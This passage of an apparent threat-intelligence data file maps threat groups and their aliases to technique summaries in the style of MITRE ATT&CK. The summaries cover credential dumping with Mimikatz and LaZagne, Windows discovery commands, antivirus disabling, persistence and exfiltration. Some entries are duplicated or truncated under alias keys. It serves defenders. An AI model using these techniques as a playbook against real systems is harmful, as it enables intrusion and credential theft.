abuse., OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.",
    "APT34": " OilRig can download remote files onto victims., OilRig has used keylogging tools called KEYPUNCH and LONGWATCH. , OilRig has used .doc file extensions to mask malicious executables., OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning., OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion., OilRig has encrypted and encoded data in its malware, including by using base64., OilRig has abused the Outlook Home Page feature for persistence. OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse., OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used net.exe in a script with net accounts /domain to find the password policy of a domain., OilRig has used tools to identify if a mouse is connected to a targeted system., OilRig has used net localgroup administrators to find local administrators on compromised systems., OilRig has used net group /domain, net group 'domain admins' /domain, and net group 'Exchange Trusted Subsystem' /domain to find domain group permission settings., OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts., OilRig has sent spearphising emails with malicious links to potential victims., OilRig has used LinkedIn to send spearphishing links., OilRig has run tasklist on a victim's machine., OilRig has used the Plink utility and other tools to create tunnels to C2 servers., OilRig has used reg query 'HKEY_CURRENT_USER/Software/Microsoft/Terminal Server Client/Default' on a victim to query the Registry., OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment., OilRig has used Putty to access compromised systems.",
    "Helix Kitten": "OilRig has used tools to identify if a mouse is connected to a targeted system., OilRig has used net localgroup administrators to find local administrators on compromised systems., OilRig has used net group /domain, net group 'domain admins' /domain, and net group 'Exchange Trusted Subsystem' /domain to find domain group permission settings., OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts., OilRig has sent spearphising emails with malicious links to potential victims., OilRig has used LinkedIn to send spearphishing links., OilRig has run tasklist on a victim's machine., OilRig has used the Plink utility and other tools to create tunnels to C2 servers., OilRig has used reg query 'HKEY_CURRENT_USER/Software/Microsoft/Terminal Server Client/Default' on a victim to query the Registry., OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment., OilRig has used Putty to access compromised systems., OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines., OilRig has a tool called CANDYKING to capture a screenshot of user's desktop., OilRig has used web shells, often to maintain access to a victim network., OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim., OilRig has run hostname and systeminfo on a victim. , OilRig has run ipconfig /all on a victim., OilRig has used netstat -an on a victim to get a listing of network connections., OilRig has run whoami on a victim., OilRig has used sc query on a victim to gather information about services., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has delivered malicious links to achieve execution on the target system., OilRig has delivered macro-enabled documents that required targets to click the 'enable content' button to execute the payload on the system., OilRig has used compromised credentials to access other systems on a victim network., OilRig has used macros to verify if a mouse is connected to a compromised machine., OilRig has used WMI for execution., OilRig has been seen utilizing watering hole attacks to collect credentials which could be used to gain access into ICS networks. , OilRig has embedded a macro within spearphishing attachments that has been made up of both a VBScript and a PowerShell script., OilRig used spearphishing emails with malicious Microsoft Excel spreadsheet attachments. , OilRig communicated with its command and control using HTTP requests. , OilRig utilized stolen credentials to gain access to victim machines.",
    "Orangeworm": "Orangeworm is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage. Reverse engineering of Kwampirs, directly associated with Orangeworm activity, indicates significant functional and development overlaps with Shamoon., Orangeworm has used HTTP for C2., Orangeworm has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.",
    "Patchwork": "Patchwork is a cyber espionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity. Patchwork has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums. Patchwork was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018. , Patchwork and the Hangover Group have both been referenced as aliases for the threat group associated with Operation Monsoon.,    , , MONSOON is the name of an espionage campaign; we use it here to refer to the actor group behind the campaign.  , It is believed that the actors behind Patchwork are the same actors behind Operation Hangover.  , Patchwork bypassed User Access Control (UAC)., Patchwork encrypted the collected files' path with AES and then encoded them with base64., Patchwork developed a file stealer to search C:/ and collect files with certain extensions. Patchwork also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server., Patchwork has used BITS jobs to download malicious payloads., Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key., Patchwork used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine., Patchwork ran a reverse shell with Meterpreter. Patchwork used JavaScript code and .SCT files on victim machines., Patchwork used Visual Basic Scripts (VBS) on victim machines., Patchwork dumped the login data database from /AppData/Local/Google/Chrome/User Data/Default/Login Data., Patchwork used Base64 to encode C2 traffic., Patchwork collected and exfiltrated files from the infected system., Patchwork copied all targeted files to a directory called index that was eventually uploaded to the C&C server., Patchwork has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware., Patchwork has used watering holes to deliver files with exploits to initial victims., Patchwork uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641., A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions., A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading., Patchwork removed certain files and replaced them so they could not be retrieved., Patchwork payloads download additional files from the C2 server., Patchwork leveraged the DDE protocol to deliver their malware., Patchwork installed its payload in the startup programs folder as 'Baidu Software Update.' The group also adds its second stage payload to the startup programs as 'Net Monitor.' They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe., A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs., Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes., A Patchwork payload was packed with UPX., Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes., Patchwork has obfuscated a script with Crypto Obfuscator., Patchwork has obtained and used open-source tools such as QuasarRAT., Patchwork has used spearphishing with an attachment to deliver files with exploits to initial victims., Patchwork has used spearphishing with links to deliver files with exploits to initial victims., Patchwork has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages., A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe., Patchwork attempted to use RDP to move laterally., A Patchwork file stealer can run a TaskScheduler DLL to add persistence., Patchwork scanned the 'Program Files' directories for a directory with the string 'Total Security' (the installation path of the '360 Total Security' antivirus tool)., Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies., Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine., Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server., Patchwork has used spearphishing with links to try to get users to click, download and open malicious files., Patchwork embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware., Patchwork hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.",
    "PittyTiger": "PittyTiger is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control., PittyTiger has obtained and used tools such as Mimikatz and gsecdump., PittyTiger attempts to obtain legitimate credentials during operations.",
    "PLATINUM": "PLATINUM is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia. , PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins., PLATINUM has leveraged a zero-day vulnerability to escalate privileges., PLATINUM has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel., PLATINUM has used several different keyloggers., PLATINUM is capable of using Windows hook interfaces for information gathering such as credential access., PLATINUM has renamed rar.exe to avoid detection., PLATINUM has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control., PLATINUM has used keyloggers that are also capable of dumping credentials., PLATINUM has sent spearphishing emails with attachments to victims as its primary initial access vector., PLATINUM has used various methods of process injection including hot patching., PLATINUM has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.",
    "Play": "Play is a ransomware group that has been active since at least 2022 deploying  Playcrypt ransomware against the business, government, critical infrastructure, healthcare, and media sectors in North America, South America, and Europe. Play actors employ a double-extortion model, encrypting systems after exfiltrating data, and are presumed by security researchers to operate as a closed group., Play has used WinRAR to compress files prior to exfiltration., Play has used Base64-encoded PowerShell scripts to disable Microsoft Defender., Play has used a batch script to remove indicators of its presence on compromised hosts., Play has split victims' files into chunks for exfiltration., Play developed and employ Playcrypt ransomware., Play has used WinSCP to exfiltrate data to actor-controlled accounts., Play has exploited known vulnerabilities for initial access including CVE-2018-13379 and CVE-2020-12812 in FortiOS and CVE-2022-41082 and CVE-2022-41040 ('ProxyNotShell') in Microsoft Exchange., Play has used Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access., Play has used the Grixba information stealer to list security files and processes., Play demands ransom payments from victims to unencrypt filesystems and to not publish sensitive data exfiltrated from victim networks., Play has used tools including GMER, IOBit, and PowerTool to disable antivirus software., Play has used tools to remove log files on targeted systems., Play has used tools including Wevtutil to remove malicious files from compromised hosts., Play has used Cobalt Strike to download files to compromised machines., Play has used Base64-encoded PowerShell scripts for post exploit activities on compromised hosts., Play has used multiple tools for discovery and defense evasion purposes on compromised hosts., Play has used Mimikatz and the Windows Task Manager to dump LSASS process memory., Play has used the information stealer Grixba to check for a list of security processes., Play has used Cobalt Strike to move laterally via SMB., Play has used tools such as AdFind, Nltest, and BloodHound to enumerate shares and hostnames on compromised networks., Play has used the information-stealing tool Grixba to scan for anti-virus software., Play has leveraged tools to enumerate system information., Play has used the information-stealing tool Grixba to enumerate network information., Play has used valid VPN accounts to achieve initial access., Play has used valid domain accounts for access., Play has used valid  local accounts to gain initial access.",
    "POLONIUM": "POLONIUM is a Lebanon-based group that has primarily targeted Israeli organizations, including critical manufacturing, information technology, and defense industry companies, since at least February 2022. Security researchers assess POLONIUM has coordinated their operations with multiple actors affiliated with Iran’s Ministry of Intelligence and Security (MOIS), based on victim overlap as well as common techniques and tooling., , POLONIUM has created and used legitimate Microsoft OneDrive accounts for their operations., POLONIUM has exfiltrated stolen data to POLONIUM-owned OneDrive and Dropbox accounts. , POLONIUM has obtained and used tools such as AirVPN and plink in their operations. , POLONIUM has used the AirVPN service for operational activity., POLONIUM has used compromised credentials from an IT company to target downstream customers including a law firm and aviation company., POLONIUM has used valid compromised credentials to gain access to victim environments., POLONIUM has used OneDrive and DropBox for C2.",
    "Poseidon Group": "Poseidon Group is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the Poseidon Group as a security firm. , Poseidon Group searches for administrator accounts on both the local victim machine and the network., Poseidon Group searches for administrator accounts on both the local victim machine and the network., The Poseidon Group's Information Gathering Tool (IGT) includes PowerShell components., Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense., Poseidon Group conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers., After compromising a victim, Poseidon Group lists all running processes., Poseidon Group obtains and saves information about victim network interfaces and addresses., After compromising a victim, Poseidon Group discovers all running services.",
    "PROMETHIUM": "PROMETHIUM is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets. PROMETHIUM has demonstrated similarity to another activity group called NEODYMIUM due to overlapping victim and campaign characteristics., The name StrongPity has also been used to describe the group and the malware used by the group., , PROMETHIUM has used Registry run keys to establish persistence., PROMETHIUM has created new services and modified existing services for persistence., PROMETHIUM has created self-signed certificates to sign malicious installers., PROMETHIUM has created self-signed digital certificates for use in HTTPS C2 traffic., PROMETHIUM has used watering hole attacks to deliver malicious versions of legitimate installers., PROMETHIUM has named services to appear legitimate., PROMETHIUM has disguised malicious installer files by bundling them with legitimate software installers., PROMETHIUM has signed code with self-signed certificates., PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports., PROMETHIUM has attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities., PROMETHIUM has created admin accounts on a compromised host., During C0033, PROMETHIUM used StrongPity to collect message notifications from 17 applications. , During C0033, PROMETHIUM used StrongPity to communicate with the C2 server using HTTPS. , During C0033, PROMETHIUM used StrongPity to exfiltrate encrypted data to the C2 server. , During C0033, PROMETHIUM used StrongPity to record phone calls. , During C0033, PROMETHIUM distributed StrongPity through the compromised official Syrian E-Gov website. , During C0033, PROMETHIUM used StrongPity to encrypt C2 communication using AES. , During C0033, PROMETHIUM used StrongPity to receive the following broadcast events to establish persistence: BOOT_COMPLETED, BATTERY_LOW,USER_PRESENT, SCREEN_ON, SCREEN_OFF, or CONNECTIVITY_CHANGE. , During C0033, PROMETHIUM used StrongPity to exfiltrate to the C2 server using HTTPS. , During C0033, PROMETHIUM used StrongPity to collect file lists on the victim device. , During C0033, PROMETHIUM used StrongPity to modify permissions on a rooted device and tried to disable the SecurityLogAgent application. , During C0033, PROMETHIUM used StrongPity to receive files from the C2 and execute them via the parent application. , During C0033, PROMETHIUM used StrongPity to access the device’s location. , During C0033, PROMETHIUM used StrongPity on a compromised website to distribute a malicious version of a legitimate application. , During C0033, PROMETHIUM used StrongPity to obfuscate code and strings to evade detection. , During C0033, PROMETHIUM used StrongPity to collect call logs. , During C0033, PROMETHIUM used StrongPity to collect the device’s contact list. , During C0033, PROMETHIUM used StrongPity to collect SMS messages. , During C0033, PROMETHIUM used StrongPity to obtain a list of installed applications. , During C0033, PROMETHIUM used StrongPity to collect the device’s information, such as SIM serial number, SIM serial number, etc. , During C0033, PROMETHIUM used StrongPity to collect information regarding available Wi-Fi networks.",
    "StrongPity": "PROMETHIUM has created admin accounts on a compromised host., During C0033, PROMETHIUM used StrongPity to collect message notifications from 17 applications. , During C0033, PROMETHIUM used StrongPity to communicate with the C2 server using HTTPS. , During C0033, PROMETHIUM used StrongPity to exfiltrate encrypted data to the C2 server. , During C0033, PROMETHIUM used StrongPity to record phone calls. , During C0033, PROMETHIUM distributed StrongPity through the compromised official Syrian E-Gov website. , During C0033, PROMETHIUM used StrongPity to encrypt C2 communication using AES. , During C0033, PROMETHIUM used StrongPity to receive the following broadcast events to establish persistence: BOOT_COMPLETED, BATTERY_LOW,USER_PRESENT, SCREEN_ON, SCREEN_OFF, or CONNECTIVITY_CHANGE. , During C0033, PROMETHIUM used StrongPity to exfiltrate to the C2 server using HTTPS. , During C0033, PROMETHIUM used StrongPity to collect file lists on the victim device. , During C0033, PROMETHIUM used StrongPity to modify permissions on a rooted device and tried to disable the SecurityLogAgent application. , During C0033, PROMETHIUM used StrongPity to receive files from the C2 and execute them via the parent application. , During C0033, PROMETHIUM used StrongPity to access the device’s location. , During C0033, PROMETHIUM used StrongPity on a compromised website to distribute a malicious version of a legitimate application. , During C0033, PROMETHIUM used StrongPity to obfuscate code and strings to evade detection. , During C0033, PROMETHIUM used StrongPity to collect call logs. , During C0033, PROMETHIUM used StrongPity to collect the device’s contact list. , During C0033, PROMETHIUM used StrongPity to collect SMS messages. , During C0033, PROMETHIUM used StrongPity to obtain a list of installed applications. , During C0033, PROMETHIUM used StrongPity to collect the device’s information, such as SIM serial number, SIM serial number, etc. , During C0033, PROMETHIUM used StrongPity to collect information regarding available Wi-Fi networks.",
    "Putter Panda": "Putter Panda is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA’s 3rd General Staff Department (GSD). , , , A dropper used by Putter Panda installs itself into the ASEP Registry key HKCU/Software/Microsoft/Windows/CurrentVersion/Run with a value named McUpdate., Malware used by Putter Panda attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe)., Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads., An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).",
    "Rancor": "Rancor is a threat group that has led targeted campaigns against the South East Asia region. Rancor uses politically-motivated lures to entice victims to open malicious documents. , Rancor has used HTTP for C2., Rancor has used cmd.exe to execute commmands., Rancor has used VBS scripts as well as embedded macros for execution., Rancor has complied VBScript-generated MOF files into WMI event subscriptions for persistence., Rancor has downloaded additional malware, including by using certutil., Rancor has attached a malicious document to an email to gain initial access., Rancor launched a scheduled task to gain persistence using the schtasks /create /sc command., Rancor has used msiexec to download and execute malicious installer files over HTTP., Rancor attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.",
    "RedCurl": "RedCurl is a threat actor active since 2018 notable for corporate espionage targeting a variety of locations, including Ukraine, Canada and the United Kingdom, and a variety of industries, including but not limited to travel agencies, insurance companies, and banks. RedCurl is allegedly a Russian-speaking threat actor. The group’s operations typically start with spearphishing emails to gain initial access, then the group executes discovery and collection commands and scripts to find corporate data. The group concludes operations by exfiltrating files to the C2 servers. , RedCurl has collected information about local accounts., RedCurl has collected information about domain accounts using SysInternal’s AdExplorer functionality   ., RedCurl has collected information about email accounts., RedCurl has used HTTP, HTTPS and Webdav protocls for C2 communications. , RedCurl has downloaded 7-Zip to decompress password protected archives. , RedCurl has used batch scripts to collect data., RedCurl has used batch scripts to exfiltrate data., RedCurl has established persistence by creating entries in HKCU/Software/Microsoft/Windows/CurrentVersion/Run. , RedCurl has used PowerShell to execute commands and to download malware., RedCurl has used the Windows Command Prompt to execute commands., RedCurl has used VBScript to run malicious files., RedCurl has used a Python script to establish outbound communication and to execute commands using SMB port 445. , RedCurl used LaZagne to obtain passwords from web browsers., RedCurl has collected data from the local disk of compromised hosts., RedCurl has collected data about network drives., RedCurl has created its own tools to use during operations., RedCurl has collected emails to use in future phishing campaigns., RedCurl has used AES-128 CBC to encrypt C2 communications., RedCurl has used HTTPS for C2 communication., RedCurl has searched for and collected files on local and network drives., RedCurl added the 'hidden' file attribute to original files, manipulating victims to click on malicious LNK files., RedCurl has deleted files after execution., RedCurl has used pcalua.exe to obfuscate binary execution and remote connections. , RedCurl prompts the user for credentials through a Microsoft Outlook pop-up., RedCurl mimicked legitimate file names and scheduled tasks, e.g. MicrosoftCurrentupdatesCheck andMdMMaintenenceTask to mask malicious files and scheduled tasks., RedCurl has used netstat to check if port 4119 is open. , RedCurl has used malware with string encryption. RedCurl has also encrypted data and has encoded PowerShell commands using Base64. RedCurl has used PyArmor to obfuscate code execution of LaZagne.  Additionally, RedCurl has obfuscated downloaded files by renaming them as commonly used tools and has used echo, instead of file names themselves, to execute files. , RedCurl used LaZagne to obtain passwords from memory., RedCurl has used phishing emails with malicious files to gain initial access. , RedCurl has used phishing emails with malicious links to gain initial access., RedCurl has created scheduled tasks for persistence., RedCurl has used rundll32.exe to execute malicious files. , RedCurl has collected information about the target system, such as system information and list of network connections. , RedCurl has placed modified LNK files on network drives for lateral movement., RedCurl has used cloud storage to exfiltrate data, in particular the megatools utilities were used to exfiltrate data to Mega, a file storage service., RedCurl has gained access to a contractor to pivot to the victim’s infrastructure., RedCurl used LaZagne to obtain passwords in files., RedCurl used LaZagne to obtain passwords in the Registry. , RedCurl has used malicious links to infect the victim machines., RedCurl has used malicious files to infect the victim machines. , RedCurl has used web services to download malicious files.",
    "Rocke": "Rocke is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name Rocke comes from the email address 'rocke@live.cn' used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between Rocke and the Iron Cybercrime Group, though this attribution has not been confirmed., Rocke issued wget requests from infected systems to the C2., Rocke has executed wget and curl commands to Pastebin over the HTTPS protocol., Rocke's miner has created UPX-packed files in the Windows Start Menu Folder. , Rocke has installed an 'init.d' startup script to maintain persistence. , Rocke used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware. , Rocke has used Python-based malware to install and spread their coinminer., Rocke has installed a systemd service script to maintain persistence. , Rocke has extracted tar.gz files after downloading them from a C2 server., Rocke exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware., Rocke has changed file permissions of files so they could not be modified. , Rocke downloaded a file 'libprocesshider', which could hide files on the target system., Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists. , Rocke used scripts which detected and uninstalled antivirus software., Rocke used scripts which killed processes and added firewall rules to block traffic related to other cryptominers. , Rocke has cleared log files within the /var/log/ folder., Rocke has deleted files on infected machines. , Rocke has changed the time stamp of certain files. , Rocke used malware to download additional malicious files to the target system. , Rocke has used shell scripts which download mining executables and saves them with the filename 'java'., Rocke conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers., Rocke's miner connects to a C2 server using port 51640. , Rocke has modified UPX headers after packing files to break unpackers., Rocke's miner has created UPX-packed files in the Windows Start Menu Folder., Rocke has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC). , Rocke can detect a running process's PID on the infected machine. , Rocke's miner, 'TermsHost.exe', evaded defenses by injecting itself into Windows processes, including Notepad.exe. , Rocke has spread its coinminer via SSH. , Rocke has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them. , Rocke has distributed cryptomining malware., Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists., Rocke installed a cron job that downloaded and executed files from the C2., Rocke used scripts which detected and uninstalled antivirus software., Rocke has used uname -m to collect the name and information about the infected system's kernel., Rocke has used SSH private keys on the infected machine to spread its coinminer throughout a network., Rocke has used Pastebin, Gitee, and GitLab for Command and Control., Rocke has used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware.",
    "RTM": "RTM is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name (RTM). , RTM has used Registry run keys to establish persistence for the RTM Trojan and other tools, such as a modified version of TeamViewer remote desktop software., RTM has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network Yandex.Direct., RTM has used search order hijacking to force TeamViewer to load a malicious DLL., RTM has used spearphishing attachments to distribute its malware., RTM has used a modified version of TeamViewer and Remote Utilities for remote access., RTM has attempted to lure victims into opening e-mail attachments to execute malicious code., RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names.",
    "Saint Bear": "Saint Bear is a Russian-nexus threat actor active since early 2021, primarily targeting entities in Ukraine and Georgia. The group is notable for a specific remote access tool, Saint Bot, and information stealer, OutSteel in campaigns. Saint Bear typically relies on phishing or web staging of malicious documents and related file types for initial access, spoofing government or related entities. Saint Bear has previously been confused with Ember Bear operations, but analysis of behaviors, tools, and targeting indicates these are distinct clusters., , , , , Saint Bear has leveraged the Discord content delivery network to host malicious content for retrieval during initial access operations., Saint Bear has used the Windows Script Host (wscript) to execute intermediate files written to victim machines., Saint Bear relies extensively on PowerShell execution from malicious attachments and related content to retrieve and execute follow-on payloads., Saint Bear initial loaders will also drop a malicious Windows batch file, available via open source GitHub repositories, that disables Microsoft Defender functionality., Saint Bear has delivered malicious Microsoft Office files containing an embedded JavaScript object that would, on execution, download and execute OutSteel and Saint Bot., Saint Bear has leveraged vulnerabilities in client applications such as CVE-2017-11882 in Microsoft Office to enable code execution in victim environments., Saint Bear gathered victim email information in advance of phishing operations for targeted attacks., Saint Bear will modify registry entries and scheduled task objects associated with Windows Defender to disable its functionality., Saint Bear has impersonated government and related entities in both phishing activity and developing web sites with malicious links that mimic legitimate resources., Saint Bear will leverage malicious Windows batch scripts to modify registry values associated with Windows Defender functionality., Saint Bear clones .NET assemblies from other .NET binaries as well as cloning code signing certificates from other software to obfuscate the initial loader payload., Saint Bear initial payloads included encoded follow-on payloads located in the resources file of the first-stage loader., Saint Bear uses a variety of file formats, such as Microsoft Office documents, ZIP archives, PDF documents, and other items as phishing attachments for initial access., Saint Bear has used the Discord content delivery network for hosting malicious content referenced in links and emails., Saint Bear has used an initial loader malware featuring a legitimate code signing certificate associated with 'Electrum Technologies GmbH.', Saint Bear has, in addition to email-based phishing attachments, used malicious websites masquerading as legitimate entities to host links to malicious files for user execution., Saint Bear relies on user interaction and execution of malicious attachments and similar for initial execution on victim systems., Saint Bear contains several anti-analysis and anti-virtualization checks.",
    "Storm-0587": " The group is notable for a specific remote access tool, Saint Bot, and information stealer, OutSteel in campaigns. Saint Bear typically relies on phishing or web staging of malicious documents and related file types for initial access, spoofing government or related entities. Saint Bear has previously been confused with Ember Bear operations, but analysis of behaviors, tools, and targeting indicates these are distinct clusters., , , , , Saint Bear has leveraged the Discord content delivery network to host malicious content for retrieval during initial access operations., Saint Bear has used the Windows Script Host (wscript) to execute intermediate files written to victim machines., Saint Bear relies extensively on PowerShell execution from malicious attachments and related content to retrieve and execute follow-on payloads., Saint Bear initial loaders will also drop a malicious Windows batch file, available via open source GitHub repositories, that disables Microsoft Defender functionality., Saint Bear has delivered malicious Microsoft Office files containing an embedded JavaScript object that would, on execution, download and execute OutSteel and Saint Bot., Saint Bear has leveraged vulnerabilities in client applications such as CVE-2017-11882 in Microsoft Office to enable code execution in victim environments., Saint Bear gathered victim email information in advance of phishing operations for targeted attacks., Saint Bear will modify registry entries and scheduled task objects associated with Windows Defender to disable its functionality., Saint Bear has impersonated government and related entities in both phishing activity and developing web sites with malicious links that mimic legitimate resources.",
    "TA471": " Saint Bear will leverage malicious Windows batch scripts to modify registry values associated with Windows Defender functionality., Saint Bear clones .NET assemblies from other .NET binaries as well as cloning code signing certificates from other software to obfuscate the initial loader payload., Saint Bear initial payloads included encoded follow-on payloads located in the resources file of the first-stage loader., Saint Bear uses a variety of file formats, such as Microsoft Office documents, ZIP archives, PDF documents, and other items as phishing attachments for initial access., Saint Bear has used the Discord content delivery network for hosting malicious content referenced in links and emails., Saint Bear has used an initial loader malware featuring a legitimate code signing certificate associated with 'Electrum Technologies GmbH.', Saint Bear has, in addition to email-based phishing attachments, used malicious websites masquerading as legitimate entities to host links to malicious files for user execution., Saint Bear relies on user interaction and execution of malicious attachments and similar for initial execution on victim systems., Saint Bear contains several anti-analysis and anti-virtualization checks.",
    "Sandworm Team": "Sandworm Team is a destructive threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455. This group has been active since at least 2009., In October 2020, the US indicted six GRU Unit 74455 officers associated with Sandworm Team for the following cyber operations: the 2015 and 2016 attacks against Ukrainian electrical companies and government organizations, the 2017 worldwide NotPetya attack, targeting of the 2017 French presidential campaign, the 2018 Olympic Destroyer attack against the Winter Olympic Games, the 2018 operation against the Organisation for the Prohibition of Chemical Weapons, and attacks against the country of Georgia in 2018 and 2019. Some of these were conducted with the assistance of GRU Unit 26165, which is also referred to as APT28., , , , ,  , , , , , ,  , ,  , Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD. , Sandworm Team used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application. , During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network., Sandworm Team used various third-party email campaign management services to deliver phishing emails., Sandworm Team has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure., Sandworm Team has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations., Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning., Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP. During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. , During the 2016 Ukraine Electric Power Attack, Sandworm Team used a script to attempt RPC authentication against a number of hosts., Sandworm Team has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses. During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy., During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses., During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy., During the 2016 Ukraine Electric Power Attack, Sandworm Team used the xp_cmdshell command in MS-SQL., Sandworm Team has created VBScripts to run an SSH server. During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server., During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. , During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server., Sandworm 